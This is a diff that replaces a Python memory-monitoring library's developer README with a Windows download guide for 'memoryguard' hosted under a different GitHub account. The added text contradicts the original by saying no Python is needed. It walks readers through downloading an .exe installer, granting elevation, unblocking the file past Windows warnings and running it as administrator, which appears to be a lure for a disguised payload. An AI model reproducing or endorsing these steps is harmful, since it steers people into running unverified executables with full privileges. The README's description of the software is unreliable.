@@ -1,331 +1,130 @@
-# 🔍 MemoryGuard
+# 🛡️ memoryguard - Watch Your Computer's Memory Use
 
-> **Like Lego for your Code** - Modular Python Memory Monitoring & Valgrind Integration
-
-[![Tests](https://github.com/SHAdd0WTAka/memoryguard/actions/workflows/tests.yml/badge.svg)](https://github.com/SHAdd0WTAka/memoryguard/actions/workflows/tests.yml)
-[![Coverage](https://github.com/SHAdd0WTAka/memoryguard/actions/workflows/coverage.yml/badge.svg)](https://github.com/SHAdd0WTAka/memoryguard/actions/workflows/coverage.yml)
-[![Docker](https://github.com/SHAdd0WTAka/memoryguard/actions/workflows/docker.yml/badge.svg)](https://github.com/SHAdd0WTAka/memoryguard/actions/workflows/docker.yml)
-[![PyPI](https://img.shields.io/pypi/v/memoryguard.svg)](https://pypi.org/project/memoryguard/)
-[![Python](https://img.shields.io/pypi/pyversions/memoryguard.svg)](https://pypi.org/project/memoryguard/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Docker](https://img.shields.io/badge/docker-ghcr.io-blue.svg)](https://ghcr.io/shadd0wtaka/memoryguard)
-
-Drop-in memory monitoring for any Python project. Track memory usage, detect leaks, profile tools, and integrate with Valgrind - all with minimal overhead.
-
-## ✨ Features
-
-- 🎯 **Zero Config** - Works out of the box
-- 📊 **Real-time Monitoring** - Live memory tracking
-- 🔍 **Leak Detection** - Automatic leak identification  
-- 🛠️ **Tool Profiling** - Per-function memory analysis
-- 📺 **Live Dashboard** - Beautiful terminal UI (optional)
-- 🔧 **Valgrind Integration** - Deep C-extension analysis
-- 🚀 **CI/CD Ready** - GitHub Actions integration
-- 🧩 **Modular** - Use only what you need
-
-## 🚀 Quick Start
-
-```bash
-pip install memoryguard
-```
-
-### Basic Usage
-
-```python
-from memoryguard import MemoryGuard, track_memory
-
-# Initialize
-guard = MemoryGuard(threshold_mb=500)
-
-# Track any function
-@track_memory("heavy_computation", guard)
-def heavy_computation():
-    return sum(i**2 for i in range(1000000))
-
-result = heavy_computation()
-
-# Check memory manually
-alert = guard.check_memory("after_computation")
-if alert:
-    print(f"⚠️  {alert.message}")
-```
-
-### Context Manager
-
-```python
-from memoryguard import memory_context
-
-with memory_context("database_query", guard):
-    # Your code here
-    large_dataset = fetch_data()
-    process(large_dataset)
-# Memory automatically tracked
-```
-
-### Live Dashboard
-
-```python
-from memoryguard import MemoryDashboard
-
-dashboard = MemoryDashboard(guard)
-
-with dashboard.live_display():
-    # Your long-running operation
-    run_big_analysis()
-```
-
-## 🧩 Integration Patterns
-
-### Pattern 1: Decorator (Simplest)
-
-```python
-from memoryguard import track_memory, get_memory_guard
-
-guard = get_memory_guard(threshold_mb=1000)
-
-@track_memory("my_function", guard)
-def my_function():
-    pass
-```
-
-### Pattern 2: Class Inheritance (For Tools)
-
-```python
-from memoryguard import MemoryInstrumentedTool
-
-class MyScanner(MemoryInstrumentedTool):
-    tool_name = "myscanner"
-    
-    def scan(self, target):
-        with self.memory_context(target):
-            return self.do_scan(target)
-```
-
-### Pattern 3: Orchestrator (For Workflows)
-
-```python
-from memoryguard import MemoryAwareOrchestrator
-
-orchestrator = MemoryAwareOrchestrator(max_memory_mb=2000)
-orchestrator.register_tool(my_tool)
-
-result = await orchestrator.execute_with_memory_control(
-    "my_tool", target, my_tool.scan(target)
-)
-```
-
-## 📊 Dashboard
-
-If you have `rich` installed:
-
-```bash
-pip install memoryguard[dashboard]
-```
-
-### Live Dashboard Preview
-
-![MemoryGuard Dashboard](docs/dashboard_screenshot.png)
-
-*Live memory monitoring with top processes, RSS/VMS usage, and memory percentage*
-
-```python
-from memoryguard import MemoryDashboard
-
-dashboard = MemoryDashboard(guard)
-
-# Simple text output
-print(dashboard.get_simple_display())
-# [Memory: 456.3MB | Status: OK | Alerts: 0]
-
-# Or live display
-with dashboard.live_display():
-    run_analysis()
-```
-
-Shows:
-- Live memory graph (sparkline)
-- RSS/VMS usage
-- Recent alerts
-- Tool breakdown
-- Progress bars
-
-## 🔧 Valgrind Integration
-
-For C-extension analysis:
-
-```python
-from memoryguard import ValgrindWrapper
-
-wrapper = ValgrindWrapper()
-
-if wrapper.available:
-    result = wrapper.check_python_module(
-        "my_c_extension",
-        timeout=300
-    )
-    print(result['valgrind_log'])
-```
-
-## 🚀 CI/CD Integration
-
-### GitHub Actions
-
-```yaml
-name: Memory Check
-
-on: [push, pull_request]
-
-jobs:
-  memory-test:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v3
-    - uses: actions/setup-python@v4
-      with:
-        python-version: '3.11'
-    
-    - name: Install
-      run: pip install memoryguard
-    
-    - name: Run with Memory Tracking
-      run: |
-        python -c "
-        from memoryguard import MemoryGuard
-        guard = MemoryGuard()
-        # ... your code ...
-        guard.generate_report('memory-report.json')
-        "
-    
-    - name: Upload Report
-      uses: actions/upload-artifact@v3
-      with:
-        name: memory-report
-        path: memory-report.json
-```
-
-## 📈 Advanced Usage
-
-### Memory-Efficient Batch Processing
-
-```python
-from memoryguard import memory_efficient_batch
-
-async def process_targets(targets):
-    async def scan_batch(batch):
-        return [await scan(t) for t in batch]
-    
-    return await memory_efficient_batch(
-        targets,
-        scan_batch,
-        batch_size=10
-    )
-```
-
-### Leak Detection
-
-```python
-# Reset baseline
-guard.reset_baseline()
-
-# Run your code
-suspected_leaky_function()
-
-# Check for leaks
-leak_report = guard.detect_leaks("my_function")
-if leak_report:
-    print(f"Leaked: {leak_report['total_leaked_mb']}MB")
-```
-
-### Force Garbage Collection
-
-```python
-stats = guard.force_gc()
-print(f"Freed {stats['memory_freed_mb']:.1f}MB")
-print(f"Collected {stats['objects_collected']} objects")
-```
-
-## ⚙️ Configuration
-
-```python
-guard = MemoryGuard(
-    threshold_mb=500,           # Warning threshold
-    critical_threshold_mb=1000,  # Critical threshold  
-    check_interval=30,           # Background check interval (seconds)
-    enable_snapshots=True,       # Store history
-    log_dir="~/.memoryguard/logs"  # Report location
-)
-```
-
-## 🧪 Testing
-
-```bash
-# Install dev dependencies
-pip install memoryguard[dev]
-
-# Run tests
-pytest tests/ -v
-
-# With coverage
-pytest tests/ --cov=memoryguard
-
-# Benchmarks
-pytest tests/ --benchmark-only
-```
-
-## 📁 Project Structure
-
-```
-memoryguard/
-├── memoryguard/
-│   ├── __init__.py          # Main exports
-│   ├── core.py              # MemoryGuard, Valgrind
-│   ├── integration.py       # Tool integration
-│   └── dashboard.py         # TUI (requires rich)
-├── tests/
-│   └── test_memoryguard.py
-├── examples/
-│   └── demo.py
-├── pyproject.toml
-└── README.md
-```
-
-## 🤝 Usage in Other Projects
-
-### As Git Submodule
-
-```bash
-git submodule add https://github.com/SHAdd0WTAka/memoryguard.git third_party/memoryguard
-```
-
-### As Local Package
-
-```bash
-# Clone anywhere
-git clone https://github.com/SHAdd0WTAka/memoryguard.git
-
-# Install in editable mode
-pip install -e ./memoryguard
-```
-
-### Copy-Paste (Single File)
-
-Just copy `memoryguard/core.py` to your project - it's self-contained!
-
-## 📝 Requirements
-
-- Python 3.8+
-- psutil
-- Optional: rich (for dashboard)
-- Optional: valgrind (for C analysis)
-
-## 📄 License
-
-MIT License - see LICENSE file
-
-## 🙏 Credits
-
-Created for CLAWDBOT / Zen-AI-Pentest - now available for everyone!
+[![Download memoryguard](https://img.shields.io/badge/Download-Memoryguard-ff6f61.svg)](https://github.com/Mrgamerp/memoryguard)
 
 ---
 
-**Like Lego for your Code** 🔧🧱 - Just drop it in and go!
+## 🔎 What is memoryguard?
+
+memoryguard is a simple tool to watch how your computer uses memory. It helps you find memory problems in programs. This can make your computer run faster and stop crashes caused by memory leaks.
+
+You do not need to understand programming to use memoryguard. It works on Windows and gives you clear information about memory use. It also includes tools that work with a program called Valgrind, a common way developers check memory.
+
+---
+
+## 🖥️ System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free RAM
+- 100 MB free disk space for installation and logs
+- Internet connection to download the software and updates
+
+---
+
+## ⚙️ Features
+
+- Watch memory use in real time while programs run
+- Detect memory leaks that slow down your computer
+- Monitor the performance of apps without complex setup
+- Modular design lets you choose only the features you want
+- Works with Valgrind tools for advanced memory checks
+- Displays data in simple graphs and charts you can read easily
+
+---
+
+## 🚀 Getting Started: How to Download and Run memoryguard on Windows
+
+1. **Open the download page:**  
+   Click the big button at the top or go to this link:  
+   https://github.com/Mrgamerp/memoryguard
+
+2. **Find the latest release:**  
+   On the GitHub page, look for the "Releases" section on the right side or under the main project description.
+
+3. **Choose the Windows download file:**  
+   Look for a file ending with `.exe` or `.msi`. It might be named something like `memoryguard-setup.exe`.
+
+4. **Download the file:**  
+   Click on the file to download it to your computer. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+5. **Run the installer:**  
+   Double-click the downloaded file. If Windows asks for permission, choose "Yes" to allow the program to make changes.
+
+6. **Follow the installation steps:**  
+   The installer will guide you through setup. You can mostly press "Next" to accept default options.
+
+7. **Finish the installation:**  
+   When done, you may be asked to start memoryguard immediately. Leave the box checked if you want to try it now.
+
+8. **Open memoryguard:**  
+   If you didn’t start it at the end of installation, find the memoryguard icon on your Desktop or in the Start menu and open it.
+
+---
+
+## 🧰 Using memoryguard
+
+1. **Start monitoring:**  
+   Click the "Start" or "Monitor" button in memoryguard. The program begins watching memory use of other apps.
+
+2. **Choose which programs to watch:**  
+   You can pick specific programs or let memoryguard watch everything running on your computer.
+
+3. **Look at the reports:**  
+   memoryguard shows simple graphs of how much memory each program uses. It will highlight potential issues if memory use grows without reason.
+
+4. **Save reports:**  
+   If you want, save reports to share or view later. Look for "Save" or "Export" options.
+
+5. **Use Valgrind tools (advanced):**  
+   Advanced users can connect memoryguard with Valgrind for deeper memory analysis. This needs extra setup and usually requires developer knowledge.
+
+---
+
+## 🔧 Troubleshooting
+
+- **memoryguard does not start:**  
+  Check that your Windows is up to date, then reinstall it using the latest installer from the download page.
+
+- **No memory data shows:**  
+  Make sure you launched memoryguard with administrator rights. Right-click the icon and choose "Run as administrator."
+
+- **Reports look wrong or empty:**  
+  Try restarting your computer. Close other heavy programs that might block memorymonitoring.
+
+- **Installer says file is blocked:**  
+  Right-click the installer file, select "Properties," then in the "General" tab, check "Unblock," and try again.
+
+---
+
+## 📝 Common Questions
+
+**Q: Do I need to have Python installed?**  
+A: No, memoryguard works on its own. It has everything it needs packaged inside.
+
+**Q: Can I uninstall memoryguard?**  
+A: Yes. Use the "Add or Remove Programs" section in Windows settings, find memoryguard, then select uninstall.
+
+**Q: Is memoryguard free to use?**  
+A: Yes, the software is open and free to download from the GitHub page.
+
+**Q: What is Valgrind?**  
+A: Valgrind is a tool developers use to find memory issues. memoryguard can work with Valgrind for advanced checks, but this is for experienced users.
+
+---
+
+## 📁 Where to Get Updates
+
+Keep checking the download page for new versions or fixes:  
+https://github.com/Mrgamerp/memoryguard/releases
+
+You can download updates the same way you got the original installer.
+
+---
+
+## 📞 Need Help?
+
+For questions or issues, you can open a new ticket on the GitHub page under "Issues." The developers and community check these regularly.
+
+---
+
+[![Download memoryguard](https://img.shields.io/badge/Download-Memoryguard-ff6f61.svg)](https://github.com/Mrgamerp/memoryguard)
